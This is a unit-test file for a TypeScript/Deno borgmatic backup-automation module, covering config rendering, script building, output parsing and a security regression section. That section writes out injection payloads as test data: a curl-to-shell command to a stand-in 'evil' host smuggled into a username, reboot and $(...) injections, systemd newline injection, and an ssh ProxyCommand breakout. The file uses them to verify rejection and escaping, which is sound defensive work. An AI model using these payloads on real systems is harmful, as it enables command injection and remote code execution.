/**
 * Unit tests for @shrug/borgmatic — pure helpers (version parsing, version-aware
 * rendering, script building, output parsing) plus every method wired against an
 * injected TargetRunner seam. No live host is ever touched.
 */
import {
  assertEquals,
  assertMatch,
  assertNotMatch,
  assertRejects,
  assertThrows,
} from "jsr:@std/assert@1";
import {
  base64ToStr,
  borgTimeToMs,
  buildConfigureScript,
  buildInitRepoScript,
  buildInstallScript,
  buildStatusScript,
  configPath,
  type ExecResult,
  type GlobalArgs,
  model,
  newestArchiveTime,
  parseBorgmaticVersion,
  parseMarkers,
  redactConfig,
  redactPassphraseLeaks,
  remoteShellArgv,
  renderBorgmaticConfig,
  shQuote,
  strToBase64,
  targetDesc,
  type TargetRunner,
  usesCommandsSyntax,
} from "./borgmatic.ts";

// Schema handle for validation-rejection tests (globalArguments IS the zod schema).
// deno-lint-ignore no-explicit-any
const GARGS = (model as any).globalArguments as {
  parse: (o: unknown) => unknown;
};

// --- test doubles -----------------------------------------------------------

// deno-lint-ignore no-explicit-any
function callExec(fn: unknown, args: unknown, ctx: unknown): Promise<any> {
  return (fn as (a: unknown, c: unknown) => Promise<unknown>)(args, ctx);
}

const nullLogger = {
  debug() {},
  info() {},
  warning() {},
  error() {},
};

interface Written {
  spec: string;
  name: string;
  data: Record<string, unknown>;
}

function fakeContext(globalArgs: GlobalArgs) {
  const writes: Written[] = [];
  const context = {
    globalArgs,
    logger: nullLogger,
    writeResource: (
      spec: string,
      name: string,
      data: Record<string, unknown>,
    ) => {
      writes.push({ spec, name, data });
      return Promise.resolve({ name });
    },
  };
  return { context, writes };
}

/** A scripted runner: match on substrings of the piped script → canned result. */
function scriptedRunner(
  rules: Array<{ match: string; result: Partial<ExecResult> }>,
): { run: TargetRunner; calls: string[] } {
  const calls: string[] = [];
  const run: TargetRunner = (_cfg, script) => {
    calls.push(script);
    for (const r of rules) {
      if (script.includes(r.match)) {
        return Promise.resolve({
          stdout: r.result.stdout ?? "",
          stderr: r.result.stderr ?? "",
          code: r.result.code ?? 0,
        });
      }
    }
    return Promise.resolve({ stdout: "", stderr: "", code: 0 });
  };
  return { run, calls };
}

const baseCfg: GlobalArgs = {
  host: "192.0.2.20",
  sshUser: "root",
  sshPort: 22,
  become: false,
  becomeUser: "root",
  configDir: "/etc/borgmatic",
  configName: "config",
  borgmaticBin: "borgmatic",
  sourceDirectories: [
    "/var/lib/docker/volumes/myapp-config/_data",
  ],
  repositories: [
    {
      path: "ssh://borgwarehouse@192.0.2.10:2222/./abcd1234",
      label: "myapp",
    },
  ],
  sshKeyPath: "/root/.ssh/borg",
  encryptionPassphrase: "s3kr3t-phrase",
  compression: "lz4",
  retention: { keepDaily: 7, keepWeekly: 4, keepMonthly: 6 },
  hooks: {
    beforeBackup: [
      'sqlite3 /var/lib/docker/volumes/myapp-config/_data/data/db.sqlite3 "PRAGMA wal_checkpoint(TRUNCATE);"',
    ],
  },
  ensureInstalled: true,
  schedule: { onCalendar: "daily", randomizedDelay: "3h", persistent: true },
};

const V19 = { major: 1, minor: 9, raw: "1.9.14" };
const V20 = { major: 2, minor: 0, raw: "2.0.3" };

// --- pure helpers -----------------------------------------------------------

Deno.test("shQuote neutralizes shell metacharacters", () => {
  assertEquals(shQuote("a'b"), "'a'\\''b'");
  assertEquals(shQuote("x; rm -rf /"), "'x; rm -rf /'");
});

Deno.test("base64 round-trips UTF-8", () => {
  const s = 'PRAGMA wal_checkpoint(TRUNCATE); — ünïcödé "q"';
  assertEquals(base64ToStr(strToBase64(s)), s);
});

Deno.test("parseBorgmaticVersion parses and rejects", () => {
  assertEquals(parseBorgmaticVersion("borgmatic 1.9.14").major, 1);
  assertEquals(parseBorgmaticVersion("borgmatic 1.9.14").minor, 9);
  assertEquals(parseBorgmaticVersion("2.0.3").major, 2);
  assertEquals(parseBorgmaticVersion("2.0.3").raw, "2.0.3");
  let threw = false;
  try {
    parseBorgmaticVersion("no version here");
  } catch {
    threw = true;
  }
  assertEquals(threw, true);
});

Deno.test("usesCommandsSyntax branches on major>=2", () => {
  assertEquals(usesCommandsSyntax(V19), false);
  assertEquals(usesCommandsSyntax(V20), true);
});

Deno.test("configPath / targetDesc", () => {
  assertEquals(configPath(baseCfg), "/etc/borgmatic/config.yaml");
  assertEquals(
    configPath({ ...baseCfg, configDir: "/etc/borgmatic/", configName: "bb" }),
    "/etc/borgmatic/bb.yaml",
  );
  assertEquals(targetDesc(baseCfg), "root@192.0.2.20:22");
});

Deno.test("remoteShellArgv honours become/becomeUser", () => {
  assertEquals(remoteShellArgv(baseCfg), ["bash", "-s"]);
  assertEquals(
    remoteShellArgv({ ...baseCfg, become: true }),
    ["sudo", "-n", "bash", "-s"],
  );
  assertEquals(
    remoteShellArgv({ ...baseCfg, become: true, becomeUser: "deploy" }),
    ["sudo", "-n", "-u", "deploy", "bash", "-s"],
  );
});

// --- version-aware rendering ------------------------------------------------

Deno.test("render (1.9) emits before_backup, NOT commands", () => {
  const out = renderBorgmaticConfig(baseCfg, V19);
  assertMatch(out, /before_backup:/);
  assertEquals(/^commands:/m.test(out), false);
  // parity essentials with a real-world template.
  assertMatch(out, /source_directories:/);
  assertMatch(
    out,
    /- path: "ssh:\/\/borgwarehouse@192\.0\.2\.10:2222\/\.\/abcd1234"/,
  );
  assertMatch(out, /label: "myapp"/);
  assertMatch(out, /encryption_passphrase: "s3kr3t-phrase"/);
  assertMatch(
    out,
    /ssh_command: "ssh -i '\/root\/\.ssh\/borg' -o StrictHostKeyChecking=accept-new"/,
  );
  assertMatch(out, /compression: "lz4"/);
  assertMatch(out, /keep_daily: 7/);
  assertMatch(out, /keep_weekly: 4/);
  assertMatch(out, /keep_monthly: 6/);
  assertMatch(out, /PRAGMA wal_checkpoint\(TRUNCATE\);/);
});

Deno.test("render (2.0) emits commands, NOT before_backup", () => {
  const out = renderBorgmaticConfig(baseCfg, V20);
  assertMatch(out, /^commands:/m);
  assertMatch(out, /before: action/);
  assertMatch(out, /when:/);
  assertMatch(out, /- create/);
  assertEquals(/before_backup:/.test(out), false);
});

Deno.test("render supports encryption_passcommand (no inline passphrase)", () => {
  const out = renderBorgmaticConfig(
    {
      ...baseCfg,
      encryptionPassphrase: undefined,
      encryptionPasscommand: "pass show x",
    },
    V19,
  );
  assertMatch(out, /encryption_passcommand: "pass show x"/);
  assertEquals(/encryption_passphrase:/.test(out), false);
});

Deno.test("render supports native sqlite databases hook", () => {
  const out = renderBorgmaticConfig(
    {
      ...baseCfg,
      hooks: {
        databases: [{ type: "sqlite", name: "bb", path: "/data/db.sqlite3" }],
      },
    },
    V19,
  );
  assertMatch(out, /sqlite_databases:/);
  assertMatch(out, /- name: "bb"/);
  assertMatch(out, /path: "\/data\/db\.sqlite3"/);
});

Deno.test("render optional retention knobs", () => {
  const out = renderBorgmaticConfig(
    {
      ...baseCfg,
      retention: {
        keepHourly: 3,
        keepDaily: 7,
        keepWeekly: 4,
        keepMonthly: 6,
        keepYearly: 1,
      },
    },
    V19,
  );
  assertMatch(out, /keep_hourly: 3/);
  assertMatch(out, /keep_yearly: 1/);
});

Deno.test("render validates required fields", () => {
  let n = 0;
  for (
    const bad of [
      { ...baseCfg, sourceDirectories: [] },
      { ...baseCfg, repositories: [] },
      {
        ...baseCfg,
        encryptionPassphrase: undefined,
        encryptionPasscommand: undefined,
      },
    ]
  ) {
    try {
      renderBorgmaticConfig(bad, V19);
    } catch {
      n++;
    }
  }
  assertEquals(n, 3);
});

Deno.test("redactConfig hides the inline passphrase", () => {
  const out = renderBorgmaticConfig(baseCfg, V19);
  const red = redactConfig(out);
  assertEquals(/s3kr3t-phrase/.test(red), false);
  assertMatch(red, /encryption_passphrase: "<redacted>"/);
});

// --- script builders --------------------------------------------------------

Deno.test("install script is idempotent + covers apt and dnf", () => {
  const s = buildInstallScript(baseCfg);
  assertMatch(s, /command -v 'borgmatic'/);
  assertMatch(s, /apt-get install -y borgbackup borgmatic sqlite3/);
  assertMatch(s, /dnf install -y borgbackup borgmatic sqlite/);
});

Deno.test("configure script: keygen guard, apply-gate, atomic swap, timer", () => {
  const s = buildConfigureScript(baseCfg, "RENDERED\n");
  assertMatch(s, /if \[ ! -f "\$KEYP" \]; then/);
  assertMatch(s, /ssh-keygen -t ed25519/);
  // apply-gate: validate the temp file BEFORE swapping.
  assertMatch(s, /'borgmatic' -c "\$TMP" config validate/);
  assertMatch(s, /mv -f "\$TMP" '\/etc\/borgmatic\/config\.yaml'/);
  // timer drop-in when schedule is set.
  assertMatch(s, /borgmatic\.timer\.d/);
  assertMatch(s, /systemctl enable --now borgmatic\.timer/);
});

Deno.test("configure script omits timer when schedule unset", () => {
  const s = buildConfigureScript({ ...baseCfg, schedule: undefined }, "X\n");
  assertEquals(/systemctl enable --now borgmatic\.timer/.test(s), false);
});

Deno.test("initRepo script guards repo-create with repo-info", () => {
  const s = buildInitRepoScript(baseCfg, "repokey-blake2");
  assertMatch(s, /repo-info >\/dev\/null 2>&1; then/);
  assertMatch(s, /repo-create --encryption 'repokey-blake2'/);
});

Deno.test("status script probes config/timer/last-archive", () => {
  const s = buildStatusScript(baseCfg);
  assertMatch(s, /config validate/);
  assertMatch(s, /systemctl is-active borgmatic\.timer/);
  assertMatch(s, /repo-list --json --last 1/);
});

// --- output parsing ---------------------------------------------------------

Deno.test("parseMarkers extracts KEY=VALUE lines", () => {
  const mk = parseMarkers(
    "noise\nSWAMP_BORG_ST_VALIDATE=0\nSWAMP_BORG_ST_TIMER_ACTIVE=active\n",
  );
  assertEquals(mk.ST_VALIDATE, "0");
  assertEquals(mk.ST_TIMER_ACTIVE, "active");
});

Deno.test("borgTimeToMs treats naive borg times as UTC", () => {
  // naive (no tz) → UTC, NOT local; equals the explicit-Z instant.
  assertEquals(
    borgTimeToMs("2026-07-16T16:22:50.000000"),
    Date.parse("2026-07-16T16:22:50.000000Z"),
  );
  // an explicit tz is respected as-is.
  assertEquals(
    borgTimeToMs("2026-07-16T16:22:50+00:00"),
    Date.parse("2026-07-16T16:22:50Z"),
  );
});

Deno.test("newestArchiveTime finds max time across shapes", () => {
  const arr = JSON.stringify([
    {
      archives: [{ name: "a", time: "2026-07-15T01:00:00" }, {
        name: "b",
        time: "2026-07-16T02:00:00",
      }],
    },
  ]);
  assertEquals(newestArchiveTime(arr), "2026-07-16T02:00:00");
  assertEquals(newestArchiveTime(JSON.stringify({ archives: [] })), null);
  assertEquals(newestArchiveTime(""), null);
  assertEquals(newestArchiveTime("not json"), null);
});

// --- methods wired through the seam ----------------------------------------

Deno.test("configure: happy path writes config + attempt (1.9 → before_backup)", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run, calls } = scriptedRunner([
    { match: "--version", result: { stdout: "borgmatic 1.9.14\n" } },
    {
      match: "config validate",
      result: {
        stdout:
          "SWAMP_BORG_KEYGEN_SKIP\nSWAMP_BORG_VALIDATE_OK\nSWAMP_BORG_CONFIG_OK\nSWAMP_BORG_TIMER_OK\n",
      },
    },
  ]);
  const res = await callExec(
    model.methods.configure.execute,
    { _run: run },
    context,
  );
  assertEquals(res.dataHandles.length, 2);
  const cfgRes = writes.find((w) => w.spec === "config");
  assertEquals(cfgRes?.data.borgmaticVersion, "1.9.14");
  assertEquals(cfgRes?.data.hookStyle, "before_backup");
  assertEquals(cfgRes?.data.validated, true);
  assertEquals(cfgRes?.data.timerEnabled, true);
  // passphrase never persisted.
  assertEquals(/s3kr3t-phrase/.test(JSON.stringify(cfgRes?.data)), false);
  const att = writes.find((w) => w.spec === "attempt");
  assertEquals(att?.data.success, true);
  // install runs first (ensureInstalled), then version detection before writing.
  assertMatch(calls[0], /command -v 'borgmatic'/);
  assertMatch(calls[1], /--version/);
});

Deno.test("configure: validate failure records failed attempt and throws", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run } = scriptedRunner([
    { match: "--version", result: { stdout: "borgmatic 1.9.14\n" } },
    {
      match: "config validate",
      result: { stdout: "", stderr: "SWAMP_BORG_VALIDATE_FAIL\n", code: 48 },
    },
  ]);
  await assertRejects(
    () => callExec(model.methods.configure.execute, { _run: run }, context),
    Error,
    "configure failed",
  );
  const att = writes.find((w) => w.spec === "attempt");
  assertEquals(att?.data.success, false);
  assertEquals(att?.data.exitCode, 48);
  // no config resource on failure.
  assertEquals(writes.some((w) => w.spec === "config"), false);
});

Deno.test("configure: unparseable version aborts before writing config", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run } = scriptedRunner([
    { match: "--version", result: { stdout: "garbled\n" } },
  ]);
  await assertRejects(() =>
    callExec(model.methods.configure.execute, { _run: run }, context)
  );
  assertEquals(writes.some((w) => w.spec === "config"), false);
});

Deno.test("initRepo: created vs already-exists", async () => {
  // created
  {
    const { context, writes } = fakeContext(baseCfg);
    const { run } = scriptedRunner([
      { match: "repo-create", result: { stdout: "SWAMP_BORG_REPO_CREATED\n" } },
    ]);
    await callExec(model.methods.initRepo.execute, {
      encryption: "repokey-blake2",
      _run: run,
    }, context);
    assertEquals(writes.find((w) => w.spec === "repoInit")?.data.created, true);
  }
  // already exists (idempotent skip)
  {
    const { context, writes } = fakeContext(baseCfg);
    const { run } = scriptedRunner([
      { match: "repo-create", result: { stdout: "SWAMP_BORG_REPO_EXISTS\n" } },
    ]);
    await callExec(model.methods.initRepo.execute, {
      encryption: "repokey-blake2",
      _run: run,
    }, context);
    assertEquals(
      writes.find((w) => w.spec === "repoInit")?.data.created,
      false,
    );
  }
});

Deno.test("initRepo: auth failure surfaces the register-key hint", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run } = scriptedRunner([
    {
      match: "repo-create",
      result: { stderr: "Connection refused\n", code: 52 },
    },
  ]);
  await assertRejects(
    () =>
      callExec(model.methods.initRepo.execute, {
        encryption: "repokey-blake2",
        _run: run,
      }, context),
    Error,
    "register",
  );
  assertEquals(writes.find((w) => w.spec === "attempt")?.data.success, false);
});

Deno.test("backup: parses archive name from --stats output", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run } = scriptedRunner([
    {
      match: "create",
      result: {
        stdout: "Archive name: host-2026-07-16T12:00:00\nStats...\n",
      },
    },
  ]);
  await callExec(
    model.methods.backup.execute,
    { dryRun: false, _run: run },
    context,
  );
  const b = writes.find((w) => w.spec === "backup");
  assertEquals(b?.data.archiveName, "host-2026-07-16T12:00:00");
  assertEquals(writes.find((w) => w.spec === "attempt")?.data.success, true);
});

Deno.test("backup: transport failure (255) → failed attempt + throw", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run } = scriptedRunner([
    { match: "create", result: { stderr: "ssh: connect", code: 255 } },
  ]);
  await assertRejects(() =>
    callExec(
      model.methods.backup.execute,
      { dryRun: false, _run: run },
      context,
    )
  );
  assertEquals(writes.find((w) => w.spec === "attempt")?.data.success, false);
});

Deno.test("prune/compact/check: op resource + attempt", async () => {
  for (
    const [verb, marker] of [["prune", "prune"], ["compact", "compact"], [
      "check",
      "check",
    ]] as const
  ) {
    const { context, writes } = fakeContext(baseCfg);
    const { run } = scriptedRunner([{
      match: marker,
      result: { stdout: "ok\n" },
    }]);
    // deno-lint-ignore no-explicit-any
    await callExec(
      (model.methods as any)[verb].execute,
      { _run: run },
      context,
    );
    assertEquals(writes.find((w) => w.spec === "op")?.data.op, verb);
    assertEquals(writes.find((w) => w.spec === "attempt")?.data.success, true);
  }
});

Deno.test("listArchives: parses repo-list json → count + newest", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const listJson = JSON.stringify([
    { archives: [{ name: "a", time: "2026-07-16T02:00:00" }] },
  ]);
  const { run } = scriptedRunner([{
    match: "repo-list",
    result: { stdout: listJson },
  }]);
  await callExec(model.methods.listArchives.execute, { _run: run }, context);
  const a = writes.find((w) => w.spec === "archives");
  assertEquals(a?.data.archiveCount, 1);
  assertEquals(a?.data.newestArchiveTime, "2026-07-16T02:00:00");
});

Deno.test("status: healthy when config valid + timer active + recent archive", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const recent = new Date(Date.now() - 3_600_000).toISOString(); // 1h ago
  const lastJson = JSON.stringify([{
    archives: [{ name: "a", time: recent }],
  }]);
  const b64 = strToBase64(lastJson);
  const stdout = [
    "SWAMP_BORG_ST_CONFIG_PRESENT=1",
    "SWAMP_BORG_ST_VALIDATE=0",
    "SWAMP_BORG_ST_TIMER_ACTIVE=active",
    "SWAMP_BORG_ST_TIMER_ENABLED=enabled",
    "SWAMP_BORG_ST_NEXT=123",
    `SWAMP_BORG_ST_LAST_B64=${b64}`,
  ].join("\n") + "\n";
  const { run } = scriptedRunner([{ match: "is-active", result: { stdout } }]);
  await callExec(model.methods.status.execute, { _run: run }, context);
  const st = writes.find((w) => w.spec === "status");
  assertEquals(st?.data.healthy, true);
  assertEquals(st?.data.timerActive, true);
  assertEquals((st?.data.reasons as string[]).length, 0);
});

Deno.test("status: unhealthy with a stale archive", async () => {
  const { context, writes } = fakeContext(baseCfg);
  // baseCfg has keepDaily=7 → maxAgeHours = 7*24+2 = 170h; 200h is stale.
  const stale = new Date(Date.now() - 200 * 3_600_000).toISOString();
  const lastJson = JSON.stringify([{ archives: [{ name: "a", time: stale }] }]);
  const stdout = [
    "SWAMP_BORG_ST_CONFIG_PRESENT=1",
    "SWAMP_BORG_ST_VALIDATE=0",
    "SWAMP_BORG_ST_TIMER_ACTIVE=active",
    "SWAMP_BORG_ST_TIMER_ENABLED=enabled",
    `SWAMP_BORG_ST_LAST_B64=${strToBase64(lastJson)}`,
  ].join("\n") + "\n";
  const { run } = scriptedRunner([{ match: "is-active", result: { stdout } }]);
  await callExec(model.methods.status.execute, { _run: run }, context);
  const st = writes.find((w) => w.spec === "status");
  assertEquals(st?.data.healthy, false);
  assertMatch((st?.data.reasons as string[]).join(","), /old/);
});

Deno.test("restore: refuses non-dry-run without confirm", async () => {
  const { context } = fakeContext(baseCfg);
  const { run } = scriptedRunner([{
    match: "extract",
    result: { stdout: "" },
  }]);
  await assertRejects(
    () =>
      callExec(model.methods.restore.execute, {
        archive: "latest",
        dryRun: false,
        confirm: false,
        _run: run,
      }, context),
    Error,
    "confirm:true",
  );
});

Deno.test("restore: dry-run allowed without confirm", async () => {
  const { context, writes } = fakeContext(baseCfg);
  const { run, calls } = scriptedRunner([{
    match: "extract",
    result: { stdout: "would extract\n" },
  }]);
  await callExec(model.methods.restore.execute, {
    archive: "latest",
    dryRun: true,
    confirm: false,
    _run: run,
  }, context);
  assertEquals(writes.find((w) => w.spec === "op")?.data.op, "restore");
  assertMatch(calls[0], /--dry-run/);
});

Deno.test("model shape: type, verbs, reachable check coverage", () => {
  assertEquals(model.type, "@shrug/borgmatic");
  for (
    const v of [
      "configure",
      "initRepo",
      "backup",
      "prune",
      "compact",
      "check",
      "listArchives",
      "info",
      "status",
      "restore",
    ]
  ) {
    // deno-lint-ignore no-explicit-any
    assertEquals(typeof (model.methods as any)[v]?.execute, "function");
  }
  assertEquals(
    model.checks.reachable.appliesTo.includes("backup"),
    true,
  );
});

// --- security regression tests (adversarial review 2026-08-07) --------------

Deno.test("SEC-1: schema rejects injection in ssh/sudo/systemd/path fields", () => {
  // becomeUser / sshUser are spliced into ssh trailing args → remote shell.
  assertThrows(() =>
    GARGS.parse({ host: "h", becomeUser: "x; curl http://evil/p|sh #" })
  );
  assertThrows(() => GARGS.parse({ host: "h", sshUser: "root; reboot" }));
  // onCalendar / randomizedDelay land in a systemd drop-in (newline injection).
  assertThrows(() =>
    GARGS.parse({
      host: "h",
      schedule: { onCalendar: "daily\n[Timer]\nUnit=x" },
    })
  );
  assertThrows(() =>
    GARGS.parse({
      host: "h",
      schedule: { randomizedDelay: "3h\nPersistent=x" },
    })
  );
  // configDir with shell metacharacters.
  assertThrows(() => GARGS.parse({ host: "h", configDir: "/etc/$(reboot)" }));
});

Deno.test("SEC-1: schema accepts legitimate values", () => {
  const ok = GARGS.parse({
    host: "192.0.2.20",
    sshUser: "deploy",
    become: true,
    becomeUser: "backup-svc",
    configDir: "/etc/borgmatic",
    schedule: {
      onCalendar: "*-*-* 02:00:00",
      randomizedDelay: "3h",
      persistent: true,
    },
  }) as GlobalArgs;
  assertEquals(ok.becomeUser, "backup-svc");
  assertEquals(ok.sshUser, "deploy");
});

Deno.test("SEC-2: crafted sshKeyPath cannot inject ssh_command options", () => {
  // Attempt to break out of `ssh -i '<path>'` into an extra -o ProxyCommand.
  const evil = "id_rsa' -o ProxyCommand='touch /tmp/pwned";
  const out = renderBorgmaticConfig({ ...baseCfg, sshKeyPath: evil }, V19);
  const line = out.split("\n").find((l) => l.startsWith("ssh_command:"))!;
  // The embedded ' is shQuote-escaped (yamlDq then doubles the backslash), so
  // borg's shlex.split sees the whole payload as ONE inert -i value.
  assertMatch(line, /-i 'id_rsa'\\\\'' -o ProxyCommand=/); // escaped, quoted
  // The vulnerable raw-interpolation render would instead close the quote and
  // expose a bare ` -o ProxyCommand` option — assert that never happens.
  assertNotMatch(line, /-i 'id_rsa' -o ProxyCommand/);
});

Deno.test("SEC-3: DB hook password is redacted from the persisted config", () => {
  const cfg: GlobalArgs = {
    ...baseCfg,
    hooks: {
      databases: [
        {
          type: "postgresql",
          name: "app",
          username: "app",
          password: "S3cretDbPw!",
        },
      ],
    },
  };
  const red = redactConfig(renderBorgmaticConfig(cfg, V20));
  assertNotMatch(red, /S3cretDbPw!/);
  assertMatch(red, /password: "<redacted>"/);
});

Deno.test("SEC-4: redactPassphraseLeaks handles escaped quotes with no tail leak", () => {
  // yamlDq renders a passphrase containing " as \" — a quote-delimited regex
  // would stop at the fake boundary and leak the tail.
  const leaked = 'encryption_passphrase: "ab\\"cd-SECRETTAIL"';
  const red = redactPassphraseLeaks(leaked);
  assertNotMatch(red, /SECRETTAIL/);
  assertMatch(red, /encryption_passphrase: <redacted>/);
});
